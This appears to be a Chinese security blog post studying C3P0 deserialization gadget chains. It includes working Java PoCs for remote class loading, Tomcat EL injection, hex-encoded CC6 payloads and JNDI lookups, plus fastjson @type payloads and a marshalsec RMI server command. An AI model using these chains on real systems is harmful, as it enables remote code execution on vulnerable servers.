# C3p0反序列化


&lt;!--more--&gt;

# c3p0反序列化学习

## 前言

早早早早该学的，太懒了拖到现在😿😿😿

## 简介

C3P0是JDBC的一个连接池组件

在多线程中创建线程是一个昂贵的操作，如果有大量的小任务需要执行，并且频繁地创建和销毁线程，实际上会消耗大量的系统资源，往往创建和消耗线程所耗费的时间比执行任务的时间还长。为了提高效率，我们可以线程池，而连接池也是差不多的原理，其核心作用是预先创建并维护一定数量的数据库连接，供应用程序使用，从而避免频繁创建和关闭连接带来的性能开销。

**C3P0是**一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。 使用它的开源项目有Hibernate、Spring等。

## 环境搭建

添加依赖

```
&lt;dependency&gt;
    &lt;groupId&gt;com.mchange&lt;/groupId&gt;
    &lt;artifactId&gt;c3p0&lt;/artifactId&gt;
    &lt;version&gt;0.9.5.2&lt;/version&gt;
&lt;/dependency&gt;
```

## 利用方式

在C3P0中有三种利用方式

- URLClassLoader远程类加载，也被称为 http base 链
- JNDI
- HEX序列化字节加载器

在原生的反序列化中如果找不到其他链，则可尝试C3P0去加载远程的类进行命令执行。JNDI则适用于Jackson等利用。而HEX序列化字节加载器的方式可以利用与fj和Jackson等不出网情况下打入内存马使用。

### URLClassLoader远程类加载

#### 调用链

 `com.mchange.v2.c3p0.impl` 下的 `PoolBackedDataSourceBase` 类

其 `writeObject` 方法中有

![image-20250316130422371](https://bu.dusays.com/2025/03/18/67d95ec4495c1.png)

先用 `SerializableUtils.toByteArray` 检查 `connectionPoolDataSource` 属性是否可序列化，如果可以则直接序列化，如果不行则用 `ReferenceIndirector.indirectForm` 方法处理后再进行序列化操作

![image-20250316135438868](https://bu.dusays.com/2025/03/18/67d95ec40f228.png)

这是个接口，不能被序列化所以会进入到 catch 块，我们跟进下看这个方法怎么处理的

`com.mchange.v2.naming` 下的 `ReferenceIndirector.indirectForm` 方法

```
public IndirectlySerialized indirectForm(Object var1) throws Exception {
        Reference var2 = ((Referenceable)var1).getReference();
        return new ReferenceSerialized(var2, this.name, this.contextName, this.environmentProperties);
    }
```

调用了 `connectionPoolDataSource` 属性的 `getReference`方法，并用返回结果作为参数实例化一个`ReferenceSerialized` 对象，然后将这个对象返回，跟进 `ReferenceSerialized` 的构造方法可以发现 `reference` 就是传入的 `connectionPoolDataSource ` 属性，是我们可控的

```
ReferenceSerialized(Reference var1, Name var2, Name var3, Hashtable var4) {
    this.reference = var1;
    this.name = var2;
    this.contextName = var3;
    this.env = var4;
}
```

说完了序列化，看下其对应的反序列化操作，还是 `com.mchange.v2.c3p0.impl` 下的 `PoolBackedDataSourceBase` 

其 `readObejct` 方法

![image-20250316132105834](https://bu.dusays.com/2025/03/18/67d95ec442753.png)

可以看到会调用序列流中的对象为 `IndirectlySerialized` 类型的 `getObject` 方法，而刚才在分析序列化时，我们发现 `ReferenceIndirector.indirectForm` 方法返回的 `ReferenceSerialized` 对象就是 `IndirectlySerialized` 类型的。也就是说如果 `ReferenceSerialized` 被序列化成功了，那这里就是调用的`ReferenceSerialized#getObject` ，跟进一下

跟进后可以发现调用了 `ReferenceableUtils.referenceToObject` 这个静态方法

![image-20250316133354263](https://bu.dusays.com/2025/03/18/67d95ec44c55c.png)

上面说过 `reference` 就是传入的 `connectionPoolDataSource ` 属性，是我们可控的。继续跟进

`com.mchange.v2.naming` 下的 `ReferenceableUtils.referenceToObject`

![image-20250319221134650](https://bu.dusays.com/2025/03/19/67dad775831ec.png)

这里`var4` 是从传入的 `Reference` 对象中获取的工厂类名称，由上面的分析来看，是可控的，所以这里我们可以通过 `URLClassLoader` 实例化远程类，造成任意代码执行

这里因为实现了 `ConnectionPoolDataSource` 接口，且 `ConnectionPoolDataSource ` 接口继承于 `CommonDataSource` ，所以必须实现其所有方法

#### poc

```
package org.example;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import java.io.*;
import java.lang.reflect.Field;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class c3p0 {
    public static class exp implements ConnectionPoolDataSource, Referenceable{
        @Override
        public Reference getReference() throws NamingException {
            return new Reference(&#34;exp&#34;,&#34;exp&#34;,&#34;http://127.0.0.1:10999/&#34;);
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }
        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }
        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }
        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {
        }
        @Override
        public void setLoginTimeout(int seconds) throws SQLException {
        }
        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }
        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }
    public static void main(String[] args) throws Exception{
        PoolBackedDataSourceBase pds = new PoolBackedDataSourceBase(false);
        //将connectionPoolDataSource属性值设为恶意的class
        Class cl = Class.forName(&#34;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&#34;);
        Field connectionPoolDataSourceField = cl.getDeclaredField(&#34;connectionPoolDataSource&#34;);
        connectionPoolDataSourceField.setAccessible(true);
        connectionPoolDataSourceField.set(pds, new exp());

        Unser(pds);
    }
    public static void Unser(Object obj) throws IOException, ClassNotFoundException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bis);
        ois.readObject();
    }
}
```

exp.java

```
import java.io.IOException;

public class exp {
    public exp() throws IOException {
        Runtime.getRuntime().exec(&#34;calc&#34;);
    }
}
```

#### 总结

调用链

```
PoolBackedDataSourceBase#readObject 
	-&gt;ReferenceSerialized#getObject 
		-&gt;ReferenceableUtils#referenceToObject 
			-&gt;ObjectFactory#getObjectInstance
```

就是加载个远程恶意类

### 不出网利用

环境搭建

```
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;
    &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;
    &lt;version&gt;8.5.27&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;
    &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;
    &lt;version&gt;8.5.27&lt;/version&gt;
&lt;/dependency&gt;
```

#### 调用链

和 url 链一样，不过最后不是通过 URLClassLoader 加载远程类了，而是直接加载本地字节码

回到`com.mchange.v2.naming` 下的 `ReferenceableUtils.referenceToObject`中

![image-20250319220656007](https://bu.dusays.com/2025/03/19/67dad77585bbb.png)

可以看到这里如果`getFactoryClassLocation`方法返回为null的时候就直接加载本地字节码

加载本地字节码的类要求其实现了 javax.naming.spi.ObjectFactory 接口，并能调用`getObjectInstance`方法，可以通过加载 `Tomcat8` 中的 `org.apache.naming.factory.BeanFactory` 进行 EL 表达式注入

#### poc

改下 url 链子中的，修改下返回的 Reference ，打 el 表达式注入

```
package org.example;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;

import java.io.*;
import java.lang.reflect.Field;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class c3p0_tomcat {
    public static class exp implements ConnectionPoolDataSource, Referenceable{
        @Override
        public Reference getReference() throws NamingException {
            ResourceRef resourceRef = new ResourceRef(&#34;javax.el.ELProcessor&#34;, (String)null, &#34;&#34;, &#34;&#34;, true, &#34;org.apache.naming.factory.BeanFactory&#34;, (String)null);
            resourceRef.add(new StringRefAddr(&#34;forceString&#34;, &#34;faster=eval&#34;));
            resourceRef.add(new StringRefAddr(&#34;faster&#34;, &#34;Runtime.getRuntime().exec(\&#34;calc.exe\&#34;)&#34;));
            return resourceRef;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }
        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }
        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }
        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {
        }
        @Override
        public void setLoginTimeout(int seconds) throws SQLException {
        }
        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }
        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }
    public static void main(String[] args) throws Exception{
        PoolBackedDataSourceBase pds = new PoolBackedDataSourceBase(false);
        Class cl = Class.forName(&#34;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&#34;);
        Field connectionPoolDataSourceField = cl.getDeclaredField(&#34;connectionPoolDataSource&#34;);
        connectionPoolDataSourceField.setAccessible(true);
        connectionPoolDataSourceField.set(pds, new exp());

        Unser(pds);
    }
    public static void Unser(Object obj) throws IOException, ClassNotFoundException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bis);
        ois.readObject();
    }
}
```

#### 总结

url 链的不出网打法，但是需要 tomcat8 的依赖

### hex base

#### 调用链

如果不出网，而且是fastjson或jackson的情况，可以用这个Gadget，该利用链能够反序列化一串十六进制字符串，因此实际利用需要有存在反序列化漏洞的组件

定位到 `com.mchange.v2.c3p0.impl` 下的 `WrapperConnectionPoolDataSource` 类中 

其构造函数调用了 `C3P0ImplUtils.parseUserOverridesAsString` 方法

![image-20250316164856585](https://bu.dusays.com/2025/03/18/67d95ec45ab83.png)

跟进一下

```
public static Map parseUserOverridesAsString(String userOverridesAsString) throws IOException, ClassNotFoundException {
        if (userOverridesAsString != null) {
            String hexAscii = userOverridesAsString.substring(&#34;HexAsciiSerializedMap&#34;.length() &#43; 1, userOverridesAsString.length() - 1);
            byte[] serBytes = ByteUtils.fromHexAscii(hexAscii);
            return Collections.unmodifiableMap((Map)SerializableUtils.fromByteArray(serBytes));
        } else {
            return Collections.EMPTY_MAP;
        }
    }
```

先是调用 `fromHexAscii`将其传入的 `userOverridesAsString` 16进制解码，再用 `fromByteArray` 将其转换为map类，其输入必须满足`HexAsciiSerializedMap{xxx}` 的格式，其中`{`和`}`用其他任意字符代替均可

跟进看下 `fromByteArray` 的实现

```
public static Object fromByteArray(byte[] var0) throws IOException, ClassNotFoundException {
        Object var1 = deserializeFromByteArray(var0);
        return var1 instanceof IndirectlySerialized ? ((IndirectlySerialized)var1).getObject() : var1;
    }
```

触发了 `deserializeFromByteArray` 方法，然后判断反序列化后的对象 `var1` 是否是 `IndirectlySerialized` 类型，如果是则调用其 `getObject` 方法，如果不是则直接返回 `var1`

继续跟进 `deserializeFromByteArray` 

```
public static Object deserializeFromByteArray(byte[] var0) throws IOException, ClassNotFoundException {
        ObjectInputStream var1 = new ObjectInputStream(new ByteArrayInputStream(var0));
        return var1.readObject();
    }
```

这里直接反序列化了

ok 看下怎么传参，参数是由 `getUserOverridesAsString()` 方法获得的，可以用其 setter 方法来赋值

![image-20250316202100033](https://bu.dusays.com/2025/03/18/67d95ec4710ff.png)

#### poc

随便拿条链子，我这里拿cc6，相较于其他cc链，cc6用的更多一点

```
package org.example;

import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.util.HashMap;
import java.util.Map;
import java.lang.reflect.Field;


public class c3p0_hexbase {
    public static void main(String[] args)throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&#34;getMethod&#34;, new Class[]{String.class, Class[].class}, new Object[]{&#34;getRuntime&#34;, null}),
                new InvokerTransformer(&#34;invoke&#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer(&#34;exec&#34;, new Class[]{String.class}, new Object[]{&#34;calc&#34;}),
        };

        ChainedTransformer cha = new ChainedTransformer(transformers);
        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
        Map&lt;Object, Object&gt; Lazy = LazyMap.decorate(map,new ConstantTransformer(1));

        TiedMapEntry Tie=new TiedMapEntry(Lazy,&#34;aaa&#34;);
        HashMap&lt;Object,Object&gt; hashmap = new HashMap&lt;&gt;();
        hashmap.put(Tie,&#34;test&#34;);
        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;
        Field factoryField = lazyMapClass.getDeclaredField(&#34;factory&#34;);
        factoryField.setAccessible(true);
        factoryField.set(Lazy, cha);
        Lazy.remove(&#34;aaa&#34;);
        serilize(hashmap);

        InputStream in = new FileInputStream(&#34;test.bin&#34;);
        byte[] bytein = toByteArray(in);
        String Hex = &#34;HexAsciiSerializedMap{&#34;&#43;bytesToHexString(bytein,bytein.length)&#43;&#34;}&#34;;
        WrapperConnectionPoolDataSource exp = new WrapperConnectionPoolDataSource();
        exp.setUserOverridesAsString(Hex);
    }
    public static void serilize(Object obj)throws IOException {
        ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(&#34;test.bin&#34;));
        out.writeObject(obj);
    }
    //将输入流转换为字节数组
    public static byte[] toByteArray(InputStream in) throws IOException {
        byte[] classBytes;
        classBytes = new byte[in.available()];
        in.read(classBytes);
        in.close();
        return classBytes;
    }
    //将字节数组转换为十六进制
    public static String bytesToHexString(byte[] bArray, int length) {
        StringBuffer sb = new StringBuffer(length);

        for(int i = 0; i &lt; length; &#43;&#43;i) {
            String sTemp = Integer.toHexString(255 &amp; bArray[i]);
            if (sTemp.length() &lt; 2) {
                sb.append(0);
            }

            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }
}
```

上面分析到能调用 setter 和 getter ，不难想到 fastjson ，fastjson 的 poc ，这里我拿的是最简单的 1.2.24 版本的来举例的

```
        String hex = &#34;序列化后的hex数据&#34;;

        String payload = &#34;{&#34; &#43;
                &#34;\&#34;@type\&#34;:\&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&#34;,&#34; &#43;
                &#34;\&#34;userOverridesAsString\&#34;:\&#34;HexAsciiSerializedMap:&#34; &#43; hex &#43; &#34;;\&#34;,&#34; &#43;
                &#34;}&#34;;
        JSON.parse(payload);
```

#### 总结

调用栈

```
deserializeFromByteArray:144, SerializableUtils (com.mchange.v2.ser)
fromByteArray:123, SerializableUtils (com.mchange.v2.ser)
parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl)
vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0)
fireVetoableChange:375, VetoableChangeSupport (java.beans)
fireVetoableChange:271, VetoableChangeSupport (java.beans)
setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl)
```

fastjson的调用栈

```
deserializeFromByteArray:144, SerializableUtils (com.mchange.v2.ser)
fromByteArray:123, SerializableUtils (com.mchange.v2.ser)
parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl)
vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0)
fireVetoableChange:375, VetoableChangeSupport (java.beans)
fireVetoableChange:271, VetoableChangeSupport (java.beans)
setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:593, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:137, JSON (com.alibaba.fastjson)
parse:128, JSON (com.alibaba.fastjson)
```

简单来说就是 `WrapperConnectionPoolDataSource` 的构造方法可以触发反序列化恶意hex数据，而`setUserOverridesAsString` 方法则能对其赋值，fastjson 可以触发任意 setter 方法，不用手动触发

### JNDI注入

同样也是在fastjson，jackson环境中可用。jndi适用于jdk8u191以下支持reference情况

![image-20250317164110447](https://bu.dusays.com/2025/03/18/67d95ec52006c.png)

#### 调用链

定位到 `com.mchange.v2.c3p0` 下的 `JndiRefConnectionPoolDataSource`

看到其 `setLoginTimeout` 函数

```
WrapperConnectionPoolDataSource wcpds;
...
public void setLoginTimeout(int seconds) throws SQLException {
        this.wcpds.setLoginTimeout(seconds);
    }
```

调用了 `WrapperConnectionPoolDataSource#setLoginTimeout` ，跟进发现又调用了 `setLoginTimeout`

```
public void setLoginTimeout(int seconds) throws SQLException {
        this.getNestedDataSource().setLoginTimeout(seconds);
    }
```

跟进发现 `getNestedDataSource()` 方法返回的是 `this.nestedDataSource` ，且发现是 `setNestedDataSource` 方法对 `nestedDataSource` 进行赋值

```
    public synchronized DataSource getNestedDataSource() {
        return this.nestedDataSource;
    }

    public synchronized void setNestedDataSource(DataSource nestedDataSource) {
        DataSource oldVal = this.nestedDataSource;
        this.nestedDataSource = nestedDataSource;
        if (!this.eqOrBothNull(oldVal, nestedDataSource)) {
            this.pcs.firePropertyChange(&#34;nestedDataSource&#34;, oldVal, nestedDataSource);
        }

    }
```

经过上面分析，我们知道在 `JndiRefConnectionPoolDataSource` 类调用 `setLoginTimeout` 时。对 `WrapperConnectionPoolDataSource` 进行了实例化并调用了 `setNestedDataSource` 方法为 `nestedDataSource` 变量赋值

回头看到 `JndiRefConnectionPoolDataSource` 的构造类

```
    public JndiRefConnectionPoolDataSource(boolean autoregister) {
        this.jrfds = new JndiRefForwardingDataSource();
        this.wcpds = new WrapperConnectionPoolDataSource();
        this.wcpds.setNestedDataSource(this.jrfds);
        if (autoregister) {
            this.identityToken = C3P0ImplUtils.allocateIdentityToken(this);
            C3P0Registry.reregister(this);
        }

    }
```

发现这里调用了 `WrapperConnectionPoolDataSource#setNestedDataSource` ，并将 `JndiRefForwardingDataSource` 类的实例当作参数传入。因此结合前面的分析，我们知道会调用 `JndiRefForwardingDataSource#setLoginTimeout`，继续跟进看下其实现

```
    public void setLoginTimeout(int seconds) throws SQLException {
        this.inner().setLoginTimeout(seconds);
    }
```

调用了 `inner()` 方法，继续跟进

```
    private synchronized DataSource inner() throws SQLException {
        if (this.cachedInner != null) {
            return this.cachedInner;
        } else {
            DataSource out = this.dereference();
            if (this.isCaching()) {
                this.cachedInner = out;
            }

            return out;
        }
    }
```

这里当 `cachedInner` 为空时就会调用 `dereference` ，然后跟进就会发现调用了 `lookup`

![image-20250317175307454](https://bu.dusays.com/2025/03/18/67d95ec47cbb5.png)

这里 `jndiName` 的值由 `setJndiName` 决定

#### poc

借助[marshalsec](https://github.com/mbechler/marshalsec)项目，启动一个RMI服务器，监听9999端口，并制定加载远程类 exp.class

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &#34;http://127.0.0.1:9991/#exp&#34; 9999
```

记得在 9991 端口开 http 

```
package org.example;

import com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource;

public class c3p0_jndi {
    public static void main(String[] args)throws Exception {

        JndiRefConnectionPoolDataSource exp = new JndiRefConnectionPoolDataSource();
        exp.setJndiName(&#34;rmi://localhost:9999/hello&#34;);
        exp.setLoginTimeout(1);

    }
}
```

![image-20250317181450729](https://bu.dusays.com/2025/03/18/67d95ec4829e2.png)

和 hex 那条链子差不多的原理，会用到 setter 方法，那就可以用 fastjson 打

```
        String payload = &#34;{&#34; &#43;
                &#34;\&#34;@type\&#34;:\&#34;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&#34;,&#34; &#43;
                &#34;\&#34;JndiName\&#34;:\&#34;rmi://localhost:9999/hello\&#34;, &#34; &#43;
                &#34;\&#34;LoginTimeout\&#34;:0&#34; &#43;
                &#34;}&#34;;
        JSON.parse(payload);
```

#### 总结

调用栈

```
dereference:112, JndiRefForwardingDataSource (com.mchange.v2.c3p0)
inner:134, JndiRefForwardingDataSource (com.mchange.v2.c3p0)
setLoginTimeout:157, JndiRefForwardingDataSource (com.mchange.v2.c3p0)
setLoginTimeout:309, WrapperConnectionPoolDataSource (com.mchange.v2.c3p0)
setLoginTimeout:302, JndiRefConnectionPoolDataSource (com.mchange.v2.c3p0)
```

先是创个 `JndiRefConnectionPoolDataSource` 的实例，让 `WrapperConnectionPoolDataSource#setNestedDataSource` 的参数值为 `JndiRefForwardingDataSource` 的实例，方便之后触发 `JndiRefForwardingDataSource#setLoginTimeout` 打 jndi 

fastjson 的调用栈

```
dereference:112, JndiRefForwardingDataSource (com.mchange.v2.c3p0)
inner:134, JndiRefForwardingDataSource (com.mchange.v2.c3p0)
setLoginTimeout:157, JndiRefForwardingDataSource (com.mchange.v2.c3p0)
setLoginTimeout:309, WrapperConnectionPoolDataSource (com.mchange.v2.c3p0)
setLoginTimeout:302, JndiRefConnectionPoolDataSource (com.mchange.v2.c3p0)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:-1, FastjsonASMDeserializer_1_JndiRefConnectionPoolDataSource (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:137, JSON (com.alibaba.fastjson)
parse:128, JSON (com.alibaba.fastjson)
```

差不多的

## 总结

出网的话都可以打，url 链加载远程字节码或本地打 el 表达式注入，jndi 注入，hex 链

不出网的话就只能打，url 加载本地字节码打 el 表达式注入，hex 链反序列化16进制字符串

hex 链和 jndi 上面 poc 都是调用的 setter 来打的，getter 还没试过，都可以结合 fastjson 或者 jackson

## 参考

https://www.cnblogs.com/gaorenyusi/p/18475139

https://tttang.com/archive/1411/#toc_poc_1

https://infernity.top/2025/03/13/C3P0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8

https://nlrvana.github.io/c3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#c3p0%E9%93%BE%E5%AD%90%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%E4%B8%8Eexp


---

> 作者: 6s6  
> URL: http://localhost:1313/posts/44face1/  

